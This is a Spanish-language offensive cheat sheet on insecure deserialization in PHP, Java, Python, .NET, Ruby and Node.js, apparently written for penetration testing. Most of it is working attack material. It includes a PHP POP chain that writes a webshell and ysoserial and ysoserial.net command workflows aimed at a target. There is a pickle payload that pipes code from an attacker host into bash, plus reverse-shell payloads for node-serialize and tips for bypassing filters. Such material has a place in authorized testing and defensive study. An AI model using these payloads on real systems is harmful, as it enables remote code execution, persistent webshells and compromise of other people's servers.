---
aliases:
  - Object Injection
  - POP Chains
  - Deserialization Gadgets
  - Magic Method Abuse
tags:
  - type/cheatsheet
  - vuln/insecure-deser
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Insecure Deserialization]]'
---
# Insecure Deserialization - Object Injection

***

## PHP

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Estructura serializada | `O:8:"ClassName":N:{s:4:"prop";s:5:"value";...}` | `O` object, `s` string, `i` int, `a` array. |
| Magic methods relevantes | `__wakeup` / `__destruct` / `__toString` / `__call` / `__get` / `__set` | Triggers cuando el objeto se hidrata o se referencia. |
| Force `__destruct` trigger | Forge objeto cuya destructor llama función peligrosa | Se dispara al terminar el script. |
| Force `__wakeup` trigger | `__wakeup()` se ejecuta justo después de `unserialize()` | Inmediato. |
| Bypass `__wakeup` (CVE-2016-7124) | PHP < 5.6.25 / 7.0.10 — usar count incorrecto en serializado | `O:4:"User":2:{...}` cuando hay 1 prop → __wakeup no se llama. |
| POP chain manual | Encadenar magic methods de varias clases para llegar a sink (system / eval / file_put_contents). | Necesita auditar source PHP. |
| RCE via Phar | `phar://path/file.phar` activa unserialize del Phar metadata. | LFI + Phar = unserialize sin que app llame `unserialize()`. |
| Webshell drop | Gadget que llama `file_put_contents('/var/www/sh.php', '<?=$_GET[c]?>')` | Persistencia. |
| Symfony / Laravel chains | Frameworks con `__destruct` en classes accesibles desde autoloader | Usar phpggc. |
| WordPress / Magento gadgets | Vendor classes en `vendor/` | phpggc tiene chains pre-hechas. |
| Cookie tampering | Cookie con serializado controlado | App: `unserialize($_COOKIE['user'])`. |
| Param tampering | Param GET/POST con serializado | App: `unserialize($_POST['data'])`. |
| Generación con phpggc | `phpggc Monolog/RCE1 system "id"` | Ver `Insecure Deserialization - Tooling`. |
^deser-php

### Ejemplo POP chain manual

```php
class Logger {
    public $log_file;
    public $log_data;
    function __destruct() {
        file_put_contents($this->log_file, $this->log_data);
    }
}

$obj = new Logger();
$obj->log_file = "/var/www/html/sh.php";
$obj->log_data = '<?=`$_GET[c]`?>';

echo serialize($obj);
// O:6:"Logger":2:{s:8:"log_file";s:23:"/var/www/html/sh.php";s:8:"log_data";s:15:"<?=`$_GET[c]`?>";}
```

___

## Java

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Sink primario | `ObjectInputStream.readObject()` | Default vulnerable sin filter. |
| Header serializado | `0xACED 0x0005` (b64: `rO0ABXNy...`) | Confirma stream Java. |
| Generador estándar | `java -jar ysoserial.jar <Gadget> "<cmd>"` | Toda la lib en una herramienta. |
| Gadget CommonsCollections1-7 | `ysoserial CommonsCollections5 "id"` | Apache Commons Collections. |
| Gadget CommonsBeanutils | `ysoserial CommonsBeanutils1 "id"` | Spring + Beanutils común. |
| Gadget Spring1/Spring2 | `ysoserial Spring1 "id"` | Spring framework. |
| Gadget Hibernate | `ysoserial Hibernate1 "id"` | Apps con ORM Hibernate. |
| Gadget JBossInterceptors | `ysoserial JBossInterceptors1 "id"` | JBoss EAP. |
| Gadget URLDNS (probe) | `ysoserial URLDNS "http://canary.oast.fun/"` | No-RCE, solo confirma deser activa. |
| Gadget JRMPClient/JRMPListener | RMI over HTTP — más raro. | Stack legacy. |
| `Content-Type: application/x-java-serialized-object` | Endpoint que acepta serial directo | RMI, JMX, RMI-IIOP. |
| Wrap en GZip | Si filtro escanea `aced0005` directo, gzip-comprimir antes de b64. | Algunos parsers descomprimen auto. |
| Gadget allowlist bypass (JEP 290) | Clases permitidas + filtros — usar `LookAndFeel` o `BeanContextSupport` | Bypass de jdk.serialFilter. |
^deser-java

### Workflow Java

```bash
# 1. Probe con URLDNS (canary)
PAYLOAD=$(java -jar ysoserial.jar URLDNS "http://abc123.oast.fun/" | base64 -w0)
curl -X POST -H "Content-Type: application/x-java-serialized-object" \
  --data-binary "@<(echo $PAYLOAD | base64 -d)" https://target/api/deser

# 2. Si DNS query llega → confirmado. Probar gadget RCE
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker/x" \
  | base64 -w0 > rce.b64

# 3. Inyectar (depende del transport)
curl -X POST --data-binary "@<(base64 -d rce.b64)" https://target/api
```

___

## Python

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Sink primario | `pickle.loads()` / `cPickle.loads()` / `pickle.load()` | RCE inmediato. |
| Magic method | `__reduce__` retorna `(callable, args)` → ejecuta al deserializar. | Mecanismo declarativo. |
| Payload mínimo | `class E: \n  def __reduce__(self): return (os.system, ('id',))` + `pickle.dumps(E())` | Boilerplate base. |
| Header pickle | `0x80 0x04` (proto 4) / `0x80 0x05` (proto 5) | Magic byte primer. |
| Pickle base64 | `pickle.dumps + base64.b64encode` | Para transport en cookies/JSON. |
| ML pickle (joblib / sklearn) | Models `.pkl` / `.joblib` | Carga de modelo = ejecución del payload. |
| `numpy.load(allow_pickle=True)` | NumPy pre-1.16.3 default = True | Vector menos conocido. |
| `pandas.read_pickle()` | Pandas DataFrame | Mismo riesgo. |
| `dill` / `cloudpickle` | Forks de pickle más permisivos | Mismas vulnerabilidades. |
| `shelve` / `dbm` | DB-like que usa pickle internamente | Mismo vector. |
| Restricted unpickler bypass | Si lib usa `Unpickler.find_class` filter | Bypass con módulos no listados. |
| `fickling` | `fickling --check ./model.pkl` | Análisis estático sin ejecutar. |
| `fickling` exploit | `fickling --inject 'os.system("id")' ./benign.pkl` | Inyectar código en pickle existente. |
^deser-python

### Payload Python mínimo

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/x | bash',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
# gASVNAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1jdXJsIGh0dHA6Ly9hdHRhY2tlci94IHwgYmFzaJSFlFKULg==
```

___

## .NET

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Sink primario | `BinaryFormatter.Deserialize()` / `LosFormatter` / `ObjectStateFormatter` / `NetDataContractSerializer` / `SoapFormatter` | Múltiples APIs vulnerables. |
| Generador estándar | `ysoserial.net.exe -g <Gadget> -f <Formatter> -c "<cmd>"` | Equivalente .NET de ysoserial. |
| Gadget TextFormattingRunProperties | `-g TextFormattingRunProperties -f BinaryFormatter -c "calc"` | Default reliable. |
| Gadget TypeConfuseDelegate | Bypass de filtros de tipo | Gadget potente. |
| Gadget WindowsClaimsIdentity | .NET Framework 4.7+ | Específico. |
| Formatter BinaryFormatter | `-f BinaryFormatter` | El más común. |
| Formatter LosFormatter (ViewState) | `-f LosFormatter` | ASP.NET ViewState. |
| Formatter ObjectStateFormatter | `-f ObjectStateFormatter` | ViewState moderno. |
| Formatter Json.Net | `-f Json.Net` | Newtonsoft con TypeNameHandling. |
| ViewState exploit (no MAC) | `ysoserial.net -p ViewState -g TextFormatting -c "calc" --path="/page.aspx"` | Si MAC desactivado. |
| ViewState exploit (con MAC key) | `--validationkey=<hex> --validationalg=SHA1` | Necesita key del web.config. |
| `.NET deser via JSON.NET` | `{"$type":"System.IO.FileInfo, mscorlib","fileName":"..."}` | TypeNameHandling = All / Auto. |
| Gadget allowlist bypass | `--allowlist-bypass` flag | Para SerializationBinder strict. |
^deser-dotnet

### ViewState exploit completo

```bash
# 1. Extraer ViewState validation key (si tenés acceso a web.config)
grep -E 'validationKey|decryptionKey' web.config

# 2. Generar payload
ysoserial.net.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc <b64-payload>" \
  --path="/page.aspx" \
  --apppath="/" \
  --validationkey="<hex>" \
  --validationalg="SHA1" \
  --decryptionkey="<hex>" \
  --decryptionalg="AES"

# 3. POST __VIEWSTATE field
curl -X POST -d "__VIEWSTATE=<payload>" https://target/page.aspx
```

___

## Ruby

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Sink Marshal | `Marshal.load()` / `Marshal.restore()` | RCE directo si input controlado. |
| Sink YAML | `YAML.load()` (pre 3.1) / `Psych.load` (pre 3.1) | RCE en versiones viejas. |
| Marshal magic | `0x04 0x08` | Confirma Marshal. |
| Gadget Rails 4.x (CVE-2013-0156) | YAML load arbitrary classes | Histórico. |
| Gadget universal Rails (universalrxss) | Disponible en `universalrxss` por Frohoff | Universal Ruby gadget. |
| ERB injection via Marshal | Forge `ERB.new("<%= cmd %>")` | Runtime template eval. |
| Magic methods Ruby | `_load` / `marshal_dump` / `marshal_load` | Análogos a __wakeup PHP. |
| YAML.safe_load | Si usa safe_load → bypass via permitted_classes | A veces poorly configured. |
| Sinatra / Rails session | `_session_id` cookie con Marshal | Session hijack + deser. |
| Generador | No hay tool standard tipo ysoserial — armar manual | Más artesanal. |
| Universal Ruby (CVE-2013-0156) | `--- !ruby/object:ERB instance_variables: ...` | YAML payload Rails. |
^deser-ruby

### Payload Ruby YAML clásico

```yaml
--- !ruby/object:ERB
src: !ruby/object:OpenStruct
  table:
    :result: !ruby/object:Gem::Requirement
      requirements:
        !ruby/object:Gem::Package::TarReader
        io: !ruby/object:Gem::Package::TarReader::Entry
          io:
            !ruby/object:StringIO
            string: ""
          read: 1
filename: " | id"
```

(Universal Ruby gadget — varía por versión.)

___

## Node.js

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Lib vulnerable | `node-serialize` (npm) `<= 0.0.4` | `unserialize()` ejecuta IIFE. |
| Sink | `serialize.unserialize()` | Llama a `eval()` en strings con `_$$ND_FUNC$$_`. |
| Marker IIFE | `_$$ND_FUNC$$_function(){...}()` | Función auto-invocada. |
| Payload RCE básico | `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(err,stdout){console.log(stdout)})}()"}` | Standalone exec. |
| Reverse shell payload | `_$$ND_FUNC$$_function(){require('child_process').exec('bash -c "bash -i &> /dev/tcp/IP/PORT 0>&1"')}()` | Reverse shell directo. |
| Lib `funcster` | Mismo patrón que `node-serialize` | Variante. |
| Lib `serialize-to-js` | Vulnerable similar | CVE-2017-5954. |
| Cookie tampering | App: `serialize.unserialize(req.cookies.profile)` | Sink en cookie parser. |
| Body tampering | App: `serialize.unserialize(req.body)` | Sink en POST handler. |
| Combinar con prototype pollution | Algunos sinks deser permiten prototype pollution chain. | Ver atomics relacionados. |
| Express session | `connect.sid` con Marshal-like | Si app usa custom serialization. |
^deser-node

### Payload Node.js completo

```javascript
// Generador
const serialize = require('node-serialize');
const obj = {
  rce: function() {
    require('child_process').exec(
      'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"',
      function(err, stdout) { console.log(stdout); }
    );
  }
};
const payload = serialize.serialize(obj);
// Resultado:
// {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec(...)}"}
```

Para forzar ejecución, agregar `()` al final del IIFE:
```
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()"}
```

***
